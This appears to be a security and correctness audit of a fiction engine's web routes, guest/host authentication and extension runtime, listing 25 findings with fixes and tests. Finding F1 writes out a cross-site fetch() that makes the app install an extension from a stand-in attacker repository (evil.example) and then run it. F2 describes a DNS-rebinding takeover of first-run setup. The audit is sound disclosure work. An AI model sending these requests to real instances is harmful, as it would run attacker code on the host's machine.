# Audit — web routes, guest/host auth, story_view, extension runtime (2026-11-01)

Auditor scope: `web/world_routes.py`, `web/story_view.py`, `web/guest_access.py`,
`web/storey_plan.py`, `web/auth_routes.py`, `web/room_routes.py`,
`web/pipeline_views.py`, `extension_runtime/api.py`, `extension_runtime/__init__.py`,
`docs/guides/EXTENSIONS.md`. Working tree at `84f3de23` (clean).
Read-only; no test files were run (every hypothesis below was settled by a
pure snippet or by tracing). Snippets ran on `.venv` with
`ENGINE_DB` pointed at a scratch file; `engine.db` was opened only
`mode=ro` through `sqlite3` for measurements.

Severity vocabulary: the brief's (LEAK, CORRUPTION, WRONG-SCENE, CRASH,
SILENT-NOOP, DEAD, STALE-DOC, PERF), plus three the security brief needed:
**SECURITY** (host/guest trust boundary, not the fiction firewall), **LANG**
(language-pack hazard that refuses valid input), **GUARD-FP** (a guard that
fires on valid input).

---

## Scope read

Read in full (every line):
- `web/world_routes.py` 1-2893
- `web/story_view.py` 1-1029
- `web/guest_access.py` 1-554
- `web/auth_routes.py` 1-279
- `web/storey_plan.py` 1-306
- `web/room_routes.py` 1-119
- `web/pipeline_views.py` 1-42
- `extension_runtime/__init__.py` 1-2654
- `extension_runtime/api.py` 1-2833

Read in part (the sections a claim or a finding depends on):
- `docs/guides/EXTENSIONS.md`: 1-268 (§1-3), 298-485 (§4 surface, stages,
  observers, commit hook, commit domains, routes), 600-680, 740-880 (routing
  seams, reading the story, one frame at a time), 1019-1081 and 1142-1262
  (§4a, §5), 1383-1455 (§6a), 1521-1550, 1666-1790 (§7.1a, §8-10).
  **Skimmed only**: 268-298, 485-600 (model calls, Director channels),
  680-740, 880-1019 (refusing a Director result, provisioning), 1081-1142,
  1262-1383 (documents, two homes, targeting characters), 1455-1521,
  1550-1666 (browser half), 1790-1838 (worked example).
- `web/app.py` (callers/surfaces of my files): 160-360, 590-760, 1000-1006,
  2670-2990, 4277-4305, 5139-5420, 5630-5702, 5833-5890, 6270-6335.
- Cross-checked readers/writers: `agents/runtime.py` 322-575, 760-805,
  1086-1106, 1855-1880, 2035-2055; `agents/common.py` 1027-1070;
  `persist/commit_room_registry.py` 256-475; `persist/commit_entities.py`
  282-500; `persist/commit_common.py` 560-590; `world/paradox.py` 150-200,
  370-440, 540-600; `story/scene.py` 464-560, 2285-2300, 2519-2568;
  `world/living_world.py` 100-350; `world/charter_place.py` 198-260;
  `world/spatial_geometry.py` 1774-1880; `world/spatial_merge.py` (calls
  only); `world/spatial_identity.py` 343-390; `world/charter_runtime.py`
  794-825; `world/structure.py` 486-511, 939-970; `story/room_slice.py`
  106-130, 351-457; `story/room_conversation.py` 144-160, 364-470;
  `story/plot_packages.py` 2160-2190, 2344-2395; `persist/chat_archive.py`
  60-100; `persist/checkpoints.py` 960-1000 (+ grep 38, 1160);
  `tools/project_check.py` 1330-1600; `tools/scene_lint.py` 640-665;
  `static/guest.html` (grep), `static/js/world_browser.js` 204-214,
  770-805, 1040-1078, 1836-1847, 2594-2619, 3465-3600;
  `static/js/settings.js` 3950-3990; `extensions/campaign-demo/extension.py`
  40-80, 195-230; tests `test_login_lockout_legibility.py` (whole),
  `test_extension_seams.py` 305-330, `test_extension_narration.py` 255-280,
  `test_living_world_extension_hooks.py` 1-80.

---

## Findings

### F1 — Same-site cross-origin pages carry the host cookie: blind CSRF can install and enable an extension (code execution)

- **Severity:** SECURITY. **Confidence:** PLAUSIBLE (every mechanism confirmed in code / the installed library; not run end-to-end in a browser).
- **Where:**
  - `web/app.py:696-716` `access_control` — the only gate on `/api/*`:
    ```python
    if guest.verify_host_session(request.cookies.get(HOST_COOKIE)):
        request.state.actor = "host"
        return await call_next(request)
    ```
    No `Origin` / `Sec-Fetch-Site` / `Content-Type` check anywhere (`grep -i "sec-fetch\|csrf\|x-requested-with"` over `web/` finds nothing).
  - `web/guest_access.py:9-16`: "SameSite=Strict means a forged cross-site request ... never carries this cookie, which is what actually stops that attack".
  - `.venv/lib/python3.12/site-packages/fastapi/routing.py:253-255` (FastAPI 0.115.14): `if not content_type_value: json_body = await request.json()` — a body with NO Content-Type is parsed as JSON.
  - `web/app.py:2706-2724` install, `:2698-2703` enable → `extension_runtime._activate_one` (`__init__.py:753-776`) imports the entry and calls `register(api)`.
- **Failure:** SameSite is per *site* (scheme + host), not per origin: `http://127.0.0.1:5173` and `http://127.0.0.1:8008` are the same site, so the Strict cookie IS sent. Any page served from another port on the host string the host browses with (a dev server, a notebook rendering untrusted HTML, another local app with an XSS) can run
  `fetch("http://127.0.0.1:8008/api/extensions/install",{method:"POST",mode:"no-cors",credentials:"include",body:new Blob(['{"source":"https://evil.example/x.git"}'])})`
  — a type-less Blob sends no Content-Type, so there is no preflight; FastAPI parses the JSON; the repo is cloned. A second blind `POST /api/extensions/x/enable` executes its Python in the engine process. The consent dialog lives only in `static/js/settings.js:3966-3973` and is bypassed. Responses are opaque to the attacker and not needed.
- **Fix:** in `access_control`, refuse unsafe methods (POST/PUT/PATCH/DELETE) whose `Sec-Fetch-Site` is present and not `same-origin`/`none`, or whose `Origin` (when present) is not the request's own scheme://host:port; or require `Content-Type: application/json` on unsafe methods (forces a preflight this server never answers). This is not header-based actor classification (the objection in `auth_routes.py:58-71`); the browser sets these headers and a page cannot forge them.
- **Test:** TestClient, host cookie, `POST /api/extensions/install` with `Sec-Fetch-Site: same-site` → 403; with `same-origin` → reaches the route.

### F2 — First-run setup can be claimed by a DNS-rebinding page running in the host's own browser

- **Severity:** SECURITY. **Confidence:** PLAUSIBLE (browser-dependent; Chromium's private/local-network-access checks may block it, other engines may not).
- **Where:** `web/auth_routes.py:58-78` `request_is_local` reads only `request.client`; `web/auth_routes.py:133-191` `auth_setup` is public (`PUBLIC_API_PATHS`, 34-41). No `Host` validation exists (no `TrustedHostMiddleware`, `grep` clean).
- **Failure:** during the unclaimed window (fresh install, or every restart while `FICTION_ENGINE_RESET_HOST=1`, `web/app.py:299-312`), a page at `http://evil.example:8008` that rebinds `evil.example` to 127.0.0.1 POSTs `/api/auth/setup`. The TCP peer is the host's own browser → loopback → `request_is_local` True → account created, `fe_host` set for `evil.example`, which is same-origin to the attacking page: it can now READ `/api/bootstrap` (provider keys, `web/app.py:176-184`) and install/enable extensions (F1). The owner then gets 409 "Account already exists" — the case `auth_routes.py:149-151` says must not happen ("a drive-by must not be able to deny the owner their own instance").
- **Fix:** allowlist `Host` (127.0.0.1, localhost, ::1, plus a host-declared public name via env) at least on `/api/auth/setup`, better for all `/api/*`. A rebinding page cannot choose the Host header its browser sends.
- **Test:** `POST /api/auth/setup` from a loopback client with `Host: evil.example:8008` → refused.

### F3 — Extension read surfaces hand out the pipeline's LIVE objects: an `on_step` observer or a stage can rewrite what later stages and the commit read, unattributed, while the persisted step keeps the original

- **Severity:** CORRUPTION (and an unattributed firewall channel). **Confidence:** CONFIRMED (snippet).
- **Where:**
  - `agents/runtime.py:796-802`: `ctx[key] = holder["v"]; saved = _with_engine_notes(holder["v"], ctx, key); ... _extension_step_saved(ctx, key, saved)`, and `agents/runtime.py:553-557`: `if not notes: return content` / `return {**content, ENGINE_NOTES_KEY: notes}` — the same object, or a shallow copy sharing every nested dict.
  - `extension_runtime/__init__.py:941-962` `notify_step_saved` → `fn(step_key, content)`.
  - `extension_runtime/api.py:1165-1191` `StepView.step/resolve/state_diff` return `ctx.get(key)` (PipelineContext.get returns the attribute, `core/pipeline_context.py:299-301`); likewise `PayloadContext.step` (1295-1302), `NarrationContext.step` (1325-1332), `DirectorContext.step` (1464-1471), `CommitView.step_content` (1254-1261).
  - The one surface that copies: `api.py:1396-1421` `DirectorResult` — "Read-only by construction: `resolve` and `interpret` are deep copies".
  - Claims contradicted: EXTENSIONS.md:417-420 ("Read-only by construction ... so you cannot feed one stage's output into another's payload through this seam"), §8 1688-1693, and `StepView`'s docstring (api.py:1146-1154).
- **Failure (snippet output):** an observer on `director_resolve` doing `content["state_diff"]["positions"].pop("Ash", None)` leaves `ctx["director_resolve"]["state_diff"] == {'positions': {}}`. Perception, narrator and `commit_all` read `ctx`, so Ash's move is never committed, while the stored `director_resolve` variant (saved before the notification) still records it: the durable step and the committed world disagree, a rerun from a later stage rehydrates the other version, and no `_extension_routing` note exists. An `after:director_resolve` stage that edits `view.state_diff` does the same. "By accident" is the realistic path: an observer that tidies or annotates what it was handed.
- **Fix:** deep-copy (as `DirectorResult` does) in `notify_step_saved` and in every `.step()` / `StepView` accessor; cost is paid only when an extension is registered.
- **Test:** register an observer and a stage that mutate nested content; assert `ctx[key]` and the commit's diff are unchanged.

### F4 — The World Browser's entity writers never touch `world_entities`: a deleted thing's row survives forever, a created thing has none, an edited thing's row keeps its old kind and name

- **Severity:** CORRUPTION. **Confidence:** CONFIRMED (every writer and the projection path traced).
- **Where:**
  - `web/world_routes.py:2289-2299` `room_entity_create` (`entities[eid] = entity; scene["positions"][eid] = room; _write_scene(...)`), `2338-2346` `room_entity_delete` (`entities.pop(str(entity_id), None)`), `1831-1912` `room_entity_patch` (kind, description, portable, light/sound fields, state).
  - `_write_scene` `web/world_routes.py:1723-1746` writes `scene` and `sync_room_registry_with_scene` only.
  - The rule: AGENTS.md:880 ("`world_entities` is a derived projection of the scene commit"); `world/paradox.py:377-382` `_project_entity_row`: "Keeps the `world_entities` projection in step with a scene write made outside the commit's own scene->projection pass (AGENTS.md Phase 3a: every scene writer owes the pair)".
  - The commit re-projects only a beat's diff: `persist/commit_entities.py:414-445` (`for entity_id, entity_def in (diff.get("entities") or {})`) and deletes only `diff.remove_entities` (`:494-497`).
  - Readers: `world/paradox.py:184-188` `_entity_exists` (fixed points are "row presence in world_entities", 161-164); `persist/commit_common.py:579-588` alias map; checkpoints (`persist/checkpoints.py:223-228`) and archives carry the rows.
- **Failure:** the host deletes `lantern` on the map → the blob loses it, the row stays, and no beat will ever `remove_entities` a thing the scene no longer holds: a "must not exist" fixed point on it stays violated (and a "must exist" one stays satisfied for a thing that is gone). A created `rope` has no row until some beat's diff happens to name it (`tools/scene_lint.py:648-655` reports "scene entity missing from world_entities"; the reverse residue — a row with no scene entity — is not linted at all). Editing kind/description leaves the row on the old values — the drift `commit_world_entities`' own docstring measured (19 name / 24 kind mismatches).
- **Fix:** in `_write_scene`, project entity changes between `before` and `scene` (upsert changed/added records, delete removed ids) through one helper shared with `paradox._project_entity_row`. Same gap in `app.world_put` (the Raw JSON tab).
- **Test:** create, patch and delete an entity through the routes; assert the `world_entities` row's presence, `kind` and `name` match the blob after each.

### F5 — World Browser scene writes are unlocked read-modify-write: concurrent edits lose updates and can leave `room_registry` holding a room the scene does not

- **Severity:** CORRUPTION. **Confidence:** PLAUSIBLE (interleaving traced; not executed).
- **Where:** every write route reads `scene = get_scene(cid, chat)` outside any transaction (e.g. `web/world_routes.py:1757`, `1828`, `1998`, `2185`, `2243`, `2286`, `2317`, `2368`, `2401`, `2445`, `2493`, `2639`, `2678`, `2702`); `_write_scene` opens `transaction()` only around the write (`1744-1746`); `_require_idle` (366-383) checks pipelines only.
- **Failure:** A = `POST /rooms` (create `pantry`), B = `PATCH /rooms/hall` (rename), both read S0. A writes S0+pantry and registers `pantry`. B writes S0+rename with `before = S0`; `pantry` is in neither B's before nor after, so `_prepare_room_registry`'s retire set (`persist/commit_room_registry.py:374-377`, `prev_rooms - rooms`) never names it → registry row live, room gone — the "hand-removed rooms live in the registry forever" case `sync_room_registry_with_scene`'s docstring exists for. Triggers that exist today: two tabs; the map's arrow keys (`static/js/world_browser.js:1840-1846` fires `onArrow` per keydown without awaiting the previous write); the Writers' Room's own out-of-band scene RMW (`story/plot_packages.py:2172-2188` `_apply_set_vistas`, `2344-2392` `_apply_set_far_looks`) racing a host edit; the threadpool runs `def` routes concurrently. Same class on the charters registry: `charter_body_station_put` (2842-2875) vs any concurrent registry writer.
- **Fix:** read, mutate and write under one `transaction()` (BEGIN IMMEDIATE serializes writers) — move `get_scene` inside it in each route — or a per-chat lock shared with the Room's package ops.
- **Test:** two threads with `get_scene` patched on `web.world_routes` to wait on a barrier after reading; assert the second write keeps the first's room and the registry equals the blob.

### F6 — Presence create matches names by `casefold`, the engine by identity fold: a second position key for one person

- **Severity:** CORRUPTION. **Confidence:** CONFIRMED (snippet).
- **Where:** `web/world_routes.py:2099-2104` `_position_key` (`str(key).strip().casefold() == folded`), `2371-2382` `room_presence_create`, `457-467` `_body_kind` (casefold). Contrast `web/app.py:5684-5691` (`chat_char_position_put` folds by `fold_identity_key`: "Rewrite THAT key rather than adding a second spelling: two keys for one person puts them in two rooms at once").
- **Failure (snippet output):** positions `{"Mr. Smith": "hall"}`; `_position_key(scene, "Mr Smith") -> None` while `room_of(scene, "Mr Smith") -> hall`; after the create, `room_of("Mr. Smith") -> hall` and `room_of("Mr Smith") -> yard`. Same for `O'Brien`/`OBrien`. `_write_scene` runs no position dedupe; the next merge's `_dedup_duplicate_position_keys` folds them by its own rule (which room survives: PLAUSIBLE, untested). The same casefold lets a punctuation variant of a cast name pass the "is the player's or a cast member's" refusal, and makes `PUT /bodies/{name}/room|pose|station` refuse a name `room_of` resolves.
- **Fix:** resolve names through the engine's matcher (`fold_identity_key` / `room_of`'s key resolution) in `_position_key` and `_body_kind`; refuse a create whose fold matches a standing key.
- **Test:** `POST /rooms/yard/presences {"name": "Mr Smith"}` with `Mr. Smith` standing → 400.

### F7 — `DELETE /rooms/{id}` ignores townspeople standing in the room

- **Severity:** CORRUPTION. **Confidence:** CONFIRMED (reading).
- **Where:** `web/world_routes.py:2246-2255` refuses only `_occupants_of(scene, room_id)` (`2155-2162`, scene `positions` only). Townspeople stand by the charter registry's `place` (written by `charter_body_station_put`, `2865-2874`); `world/charter_place.py:237-239`: `room = str(body.get("place") or ""); if room not in rooms ...: continue`.
- **Failure:** the map shows a townsperson in `smithy` (`map_view` counts charter bodies as occupants, `1237-1238`); the host deletes `smithy` → allowed, id retired; the body's `place` names a retired room, so `charter_placements` silently drops it from every view and frame, and posts anchored there dangle. The route's own rationale — "a position row naming no room is a body nowhere" — applies verbatim.
- **Fix:** include `charter_placements(registry_for(cid, frame_id), scene, frame_rooms=[room_id])` (or every undeparted body with `place == room_id`) in the refusal, naming them.
- **Test:** charter body placed in room X; DELETE /rooms/X → 400 naming the townsperson.

### F8 — The guest page is told canonical character names and hidden stage names through `stale_from.label`

- **Severity:** LEAK (the player-facing slice of a human player). **Confidence:** CONFIRMED.
- **Where:** `web/app.py:5281-5287` selects `s.key, s.label` of every stale step; `5321-5328` returns `"stale_from": {"ord", "key", "label"}` of the earliest; `agents/runtime.py:362` `"character": "Character · {name}"`, filled with the canonical name at `1100-1103`; `static/guest.html:141-146` renders ``Superseded — this text was written before “${t.stale_from.label}” was re-run.``
- **Failure:** the host edits or reruns `character:12` (Hinami) on a turn; a guest whose persona knows her only as "the woman in grey" (their `narrator_extra` never names her) reads "steps from “Character · Hinami” onward were not recomputed", and the JSON carries `key: "character:12"`. Extension stage labels (`Extension · <id> · <key>`) leak campaign internals the same way. The guest's prose is the perception-filtered `narrator_extra` slice; this field is not.
- **Fix:** for guests return `stale`/`prose_stale` and a generic phrase, or the label only when the key is `narrator`/`narrator_extra`.
- **Test:** stale `character:<id>` step with a named label; `GET /api/guest/state` as the guest; assert neither the name nor the key appears.

### F9 — A payload hook that mutates in place and then raises (or, at the Director seam, returns None) leaves an unattributed edit in what a mind / the Director / the narrator is told

- **Severity:** LEAK (the attribution guarantee) / WRONG-SCENE. **Confidence:** CONFIRMED (snippet).
- **Where:** `extension_runtime/__init__.py:1107-1114` (character), `1341-1356` (director: `except Exception: ... continue` and `if not isinstance(result, dict): continue`), `1419-1426` (narration). The hook receives `before`, which IS `current`; the skip paths drop `_note_routing` but keep the mutated object.
- **Failure (snippet output):** a character hook that sets `payload["forbidden_fact"]` and raises → returned payload `{'perception': 'a hallway', 'forbidden_fact': 'the vault code is 4471'}`, routing notes `None`. A director hook that sets `payload["campaign_rule"]` and returns `None` (the documented "leave it alone") → kept, routing notes `None`.
- **Claims contradicted:** `__init__.py:1073` "Total: any failure leaves the payload exactly as the engine assembled it"; `1300-1302`; `1383`; EXTENSIONS.md:630-631 "A hook that throws leaves the payload exactly as assembled"; §8 "every top-level key you change is attributed to you". The tests (`tests/test_extension_seams.py:312-321`, `tests/test_extension_narration.py:260-273`) raise WITHOUT mutating and compare the returned object to itself, so they cannot see this. `dispatch_director_payload` also never counts `_observer_failures` (the other two do).
- **Fix:** one helper for the three seams: hand the hook `copy.deepcopy(current)` and adopt it only on a dict/None return; or stamp after every outcome (exception path included) and attribute/restore.
- **Test:** hook mutates a nested key then raises → result equals the pre-hook deep copy (or the change is attributed); director hook mutates and returns None → attributed.

### F10 — Moving a body with `PUT /bodies/{name}/room` keeps the old room's pose detail and support forever

- **Severity:** WRONG-SCENE. **Confidence:** CONFIRMED (snippet).
- **Where:** `web/world_routes.py:2460-2467` runs only `invalidate_moved_body_pose_details`. The merge also runs `invalidate_moved_body_place_details` and `release_moved_body_supports` (`world/spatial_merge.py:2427`, `2439`), both keyed on a move inside ONE merge (`world/spatial_geometry.py:1863-1866`: `if not was or not room or str(was) == str(room): continue`), so no later merge ever sees the host's move.
- **Failure (snippet output):** Wren in `corridor` with pose `{support: "coat_stand", detail: "standing near the coat-stand, looking down toward the turn"}`; after the route and a subsequent empty-diff `merge_scene_with_diff`, Wren is in `parlour` with the same support and detail; the place-detail invalidator would have dropped it. This is F49/PB7 (that function's docstring) re-entered through the editor. `app.chat_char_position_put` (5630-5702) has the same omission.
- **Fix:** run `invalidate_moved_body_place_details(scene, before["positions"])` and `release_moved_body_supports(...)` in `body_room_put` and `chat_char_position_put` (or route both through `merge_scene_with_diff` with a positions-only diff).
- **Test:** the snippet's scene through the route; assert `detail == ""` and the support released.

### F11 — The room PATCH accepts an exit to any string: a typo becomes a permanent doorway to nowhere

- **Severity:** WRONG-SCENE. **Confidence:** CONFIRMED that it persists; downstream PLAUSIBLE.
- **Where:** `web/world_routes.py:1474-1481` refuses only empty/self/duplicate `to`; `1519-1522` `if to not in known: continue` (docstring: "A planned room the scene does not hold has no edge list to mirror onto" — but nothing checks the registry). The doorway route refuses the same input: `2641-2642` `_live_room_or_400(scene, to)`.
- **Failure (snippet output):** exits `[{"to": "kitchn", "barrier": "closed_door", "dir": "n"}]` survive `_write_scene`'s normalisers and a later merge (`effective_adjacent(...,"hall") -> [{'to': 'kitchn', ...}]`). Perception lists the doorway; a body walking through it reaches a room no plan holds.
- **Fix:** accept `to` only for a live room or a planned `room_registry` row; 400 naming the known ids otherwise.
- **Test:** PATCH exits to an unknown id → 400.

### F12 — Disabling, updating, installing or removing any extension while a turn runs can kill that turn ("unknown step ext:...")

- **Severity:** CRASH. **Confidence:** PLAUSIBLE (mechanism confirmed; the trigger needs a host action during a turn).
- **Where:** the plan is spliced at turn start (`agents/runtime.py:1145/1177/1230`); the handler is resolved at step time, `agents/runtime.py:490-492`: `if handler is None: raise RuntimeError("unknown step " + key)`. `_deregister` pops handlers (`extension_runtime/__init__.py:736-739`); `reload()` deregisters EVERY extension (`810-812`) and is called by install (`2441`), update (`2612`), remove (`2653`); disable → `activate(refresh=True)` → `_deregister`. The routes (`web/app.py:2698-2759`) hold no idle guard.
- **Failure:** a turn whose plan holds `ext:cohesion-demo:pulse` is in `director_resolve`; the host installs any other extension → `reload()` pops the handler; re-registration waits for the next `activate()`; if the pipeline reaches the stage in that gap (or the extension was disabled), the beat dies with RuntimeError although the stage is `on_error="warn"` ("a flaky extension degrades to a visible note, it does not kill a beat", api.py:2794-2796). `reload()` also drops every enabled extension's modules and re-runs every `register(api)`.
- **Fix:** in `compute_step`, a missing `ext:` handler yields a warned `{"error": "extension not loaded"}`; and/or 409 install/update/remove/disable while any pipeline runs; make install/update/remove reload only the affected id.
- **Test:** plan with an ext stage; deregister before `compute_step`; assert warned content, not an exception.

### F13 — The `living_world` provisioning contract is broken: the guide's own example is refused, `offscreen_life` is accepted and ignored, and `story_view.living_world` reports constants

- **Severity:** SILENT-NOOP (+ STALE-DOC). **Confidence:** CONFIRMED (snippet + reading).
- **Where:**
  - `world/living_world.py:123` `LIVING_WORLD_APPROACHES = ()` (since `7140b9cc`, 2026-09-20).
  - `extension_runtime/api.py:2322-2331`: `if approach not in LIVING_WORLD_APPROACHES: raise ExtensionError(...)` → every non-empty `living_world` is refused.
  - `story/scene.py:2565-2567`: `config["offscreen_life"] = OFFSCREEN_LIFE_DEFAULT` / `config["max_offscreen_actors"] = 0`, unconditional; `world/living_world.py:266` folds it into every config. `provision_story(offscreen_life=...)` (api.py:2383-2402) stores a value nothing reads.
  - `web/story_view.py:366-381`: `offscreen_life` always `"stochastic"`, `max_offscreen_actors` always `0` (the live dial is `max_bubbles`), `approaches` always `[]`.
  - `extension_runtime/api.py:1690-1697` still advertises `"living_world_provisioning"`; the set's own rule (1631-1634): a name "is not removed or repurposed while `ext_api` stays 1".
  - EXTENSIONS.md:1031-1038 (example), 1046-1050 ("the `offscreen_life` rung caps all four"), 1076 ("the four approaches"); `tests/test_living_world_extension_hooks.py:15-16` describes hook 2 with no test left.
- **Failure (snippet output):** the guide's call raises `unknown living_world approach 'routine_residue'; the approaches are ` (empty list). With `living_world=None`, `offscreen_life="deterministic"` is accepted and has no effect. An integrator reading `max_offscreen_actors` to learn how many absent threads run always reads 0.
- **Fix (owner's call — a contract decision):** accept the retired approach names as documented no-ops (they are unconditional now) and say so in the result, keep `offscreen_life` validated but documented inert, report `max_bubbles` in `story_view`; or bump `ext_api` and retire the capability name.
- **Test:** the guide's example call succeeds (or fails naming the retirement), and `story_view` reports the stored `max_bubbles`.

### F14 — The doorway PATCH accepts `desc` and never writes it

- **Severity:** SILENT-NOOP. **Confidence:** CONFIRMED (snippet).
- **Where:** `web/world_routes.py:2524-2525` `DOORWAY_FIELDS = ("barrier", "dir", "offset", "name", "material", "desc", "width", ...)` (`desc` added by `4e4d102e`); `_apply_doorway_fields` (2532-2616) handles only `("name", "material")` at 2562-2570 — no `desc` branch. The browser sends it: `static/js/world_browser.js:797-803` `wbText(..., v => doorway(to, { desc: v }))`.
- **Failure (snippet output):** PATCH `{desc, material}` → record `{'rooms': [...], 'barrier': 'open', 'material': 'paper'}`, edges unchanged. The host gets "Saved." and the card re-renders the old text; the owner's 2026-10-12 ask ("doors should have a description and material type field") is half-delivered in the editor. No test covers a doorway `desc` PATCH.
- **Fix:** add `"desc"` to that loop (record + both edges on clear), matching `PASSAGE_FIELDS` (`world/spatial_barriers.py:1012`).
- **Test:** PATCH desc → the slice's doorway carries it; empty → removed from record and edges.

### F15 — `api.add_stage` accepts an anchor naming no core step; the stage registers and never runs

- **Severity:** SILENT-NOOP. **Confidence:** CONFIRMED (snippet).
- **Where:** `extension_runtime/api.py:1769-1779` checks only the mode and the reserved prefixes; `__init__.py:907-922` and EXTENSIONS.md:1159-1161 (and 367-370) treat an unknown core as "simply not planned".
- **Failure (snippet output):** `add_stage("tally", anchor="after:director_resolv")` and `anchor="after:mapping"` (a retired stage) both register (`handler present: True`, `known core label: False`). The code's own argument for the prefix check (api.py:1554-1556: "used to register cleanly, appear in registered_stages(), and never run on any turn, with nothing anywhere saying so") applies unchanged. Core step keys are a closed set the engine owns (`agents.runtime.STEP_LABELS` and the plan builders).
- **Fix:** refuse (or flag on the extension's row) a core no plan builder can emit; keep "not planned this turn" for real keys.
- **Test:** `add_stage` with a misspelt anchor raises ExtensionError naming the valid keys.

### F16 — HTTP `story_view` / `player_view` cannot ask for the present era explicitly

- **Severity:** SILENT-NOOP (low). **Confidence:** CONFIRMED (reading).
- **Where:** `web/app.py:6273-6302`, `6305-6318`: `frame: int | None = None` then `kwargs = {} if frame is None else {"frame_id": frame}` — "omitted" and "the present" share one spelling, so the route always means "latest turn's frame" unless given an integer. The Python facade distinguishes `frame_id=None` (api.py:2559-2561). UNBUILT_PLATFORM §6.2's struck item says the asymmetry is closed; it is half closed: during a flashback an HTTP client cannot read the present.
- **Fix:** accept a sentinel (`frame=present`) mapped to `frame_id=None`.
- **Test:** latest turn in a past frame; `GET ...?frame=present` returns `frame: null` and the present's scene.

### F17 — `POST /api/extensions/{id}/enable` on an enabled extension whose `register()` failed does not retry

- **Severity:** SILENT-NOOP (low). **Confidence:** CONFIRMED (reading).
- **Where:** `extension_runtime/__init__.py:435-444` → `activate(refresh=True)`; `793-796` `if ext_id in _registered: continue` keeps the failed record, so the call returns the stale `error`. The menu works around it (it offers Disable; disable+enable retries). EXTENSIONS.md:1211 "fixing the file and re-enabling runs the fixed file" holds only for that path.
- **Fix:** `_deregister(ext_id)` a failed record in `enable_extension` before activating.
- **Test:** failing extension, fix the file, POST enable → `error` cleared.

### F18 — Adding an anchor by a non-Latin description is refused

- **Severity:** LANG (loud refusal of valid input). **Confidence:** CONFIRMED (snippet).
- **Where:** `web/world_routes.py:1570-1573`: `key = normalize_room_id(str(aid or "")) or normalize_room_id(desc)`; `if not key: raise HTTPException(400, "an anchor needs a description or an id")`. The browser keys a new anchor `""` with the typed desc (`static/js/world_browser.js:1066-1067`, `3590`). `normalize_room_id("祭壇") -> ''`.
- **Failure (snippet output):** `_apply_anchors(..., {"": {"desc": "祭壇"}})` → `400 an anchor needs a description or an id`. A Japanese-pack host cannot add a fixture from the card or the map. (Rooms and things degrade to opaque `room_2`/`thing_2` through `_mint_id` fallbacks; regions use the script-aware `normalize_region_id`, which kept `東の翼`.)
- **Fix:** mint with a script-aware fold, or fall back to `anchor`, `anchor_2`, ... against the room's anchors when the fold is empty.
- **Test:** add an anchor with a Japanese desc → 200 and present.

### F19 — `request_is_local` refuses the host's own IPv4 connection on a dual-stack bind

- **Severity:** GUARD-FP. **Confidence:** CONFIRMED (snippet).
- **Where:** `web/auth_routes.py:72-78` `ipaddress.ip_address(client.host).is_loopback`; on the shipped Python 3.12.3, `::ffff:127.0.0.1` → `False`. With `--host ::`, a local IPv4 browser is reported mapped and first-run setup answers 403 "can only be completed from the machine running Sonder" on that machine.
- **Fix:** unwrap `ipv4_mapped` before the loopback test.
- **Test:** request with client host `::ffff:127.0.0.1` → local.

### F20 — Extension HTTP routes run on the event loop

- **Severity:** PERF (availability). **Confidence:** CONFIRMED (reading; FastAPI semantics).
- **Where:** `web/app.py:2912-2936` `async def extension_route` calls the synchronous `extension_runtime.dispatch_route(...)` → `entry["fn"](Request(...))` (`__init__.py:1514-1542`) directly; `activate()` inside it takes the global `_lock`.
- **Failure:** any extension route doing real work — `api.llm_json`, `api.provision_story` (archive import), `api.generate_lived_location` ("minutes, not seconds", api.py:2452-2458), campaign-demo's `/campaign` (builds a whole `story_view` for one field, F24) — blocks every other request, the turn stream included, for its duration.
- **Fix:** `return await run_in_threadpool(extension_runtime.dispatch_route, ...)` after `await request.json()`.
- **Test:** a route that sleeps; a concurrent `GET /api/auth/status` completes first.

### F21 — A guest can store unbounded input, at an unbounded rate, that rides the next beat's prompts

- **Severity:** PERF (DoS / provider cost). **Confidence:** CONFIRMED (reading).
- **Where:** `web/app.py:5362-5378` `guest_input` (no length cap, no rate limit, any `idx >= 0`); `_player_input` (1000-1006) is `str(value)`; `_submit_player_input` (5169-5175) upserts per `(chat, idx, persona)`; `guest_state` reads all of the guest's rows on every 10 s poll (5300-5303).
- **Failure:** a guest script posting multi-megabyte lines for idx 0..N grows `turn_player_inputs` without bound, each poll re-reads it, and the next served declaration rides the Director/narrator payloads. The guest is the less-trusted actor this module exists for. A cap and a rate are the owner's numbers; none is proposed here.
- **Fix:** refuse oversized guest (and host extra-player) input; limit `idx` to the guest frame's next-beat window; reuse the join limiter's pattern for a rate.
- **Test:** oversized input → 4xx; far-future idx → 4xx.

### F22 — `api.add_route`'s docstring says ExtensionError maps to 400; the host maps it to 404

- **Severity:** STALE-DOC. **Confidence:** CONFIRMED.
- **Where:** `extension_runtime/api.py:2087-2088` ("raise `ExtensionError` for a 400") vs `web/app.py:2930-2931` (`raise HTTPException(404, str(exc))`); the guide says 404 (EXTENSIONS.md:482-483). Fix the docstring.

### F23 — EXTENSIONS.md §6a says state written in `on_turn_committed` survives a reroll; it does not

- **Severity:** STALE-DOC. **Confidence:** CONFIRMED.
- **Where:** `docs/guides/EXTENSIONS.md:1424-1425`: "an extension that wrote its state in `on_turn_committed` instead would survive a rollback it should not have". A reroll restores checkpoint N (the world BEFORE turn N): `persist/checkpoints.py:38` snapshots the whole `world` table and `:1160` deletes and re-inserts it, so `ext:<id>` rows written by turn N's hook roll back with it. The real hazard (api.py:14-20) is a mid-pipeline `set_now` surviving a failed COMMIT; the paragraph conflates the two and steers authors to commit domains for the wrong reason.

### F24 — `story_view._living_world` bypasses the cached registry on an argument that predates the cache

- **Severity:** STALE-DOC + PERF. **Confidence:** CONFIRMED (measured).
- **Where:** `web/story_view.py:382-404`: "Normalized ONCE. `registry_for` would re-read and re-parse the row this gate has already loaded"; it then runs `wget_for_frame` + `normalize_registry` (+ `registry_warnings`) on every call. `registry_for` (`world/charter_runtime.py:794-807`) returns the shared cached parse (`cached_registry`). Measured: 76 ms parse+normalize per call on chat 175's 0.9 MB registry; `core/db.py`'s own note measured 0.95-2.3 s per parse for a 41.4 MB generated-town registry. Fix: `registry = registry_for(chat_id, frame_id)` and gate on `registry.get("items")` (normalize already accepts the bare map, so the "raw row" argument does not need the uncached read).

### F25 — Station-route comment and AGENTS.md: "only the registered cast moves between rooms"

- **Severity:** STALE-DOC. **Confidence:** CONFIRMED.
- **Where:** `web/world_routes.py:2009-2012` ("moving one BETWEEN rooms is `chat_char_position_put`, which the registered cast alone has"); AGENTS.md:532 ("so only the registered cast moves between rooms -- the player's place is the story's business, as that route holds"). `PUT /bodies/{name}/room` (2425-2473) moves the player and presences, and the same AGENTS row lists it. Fix both sentences.

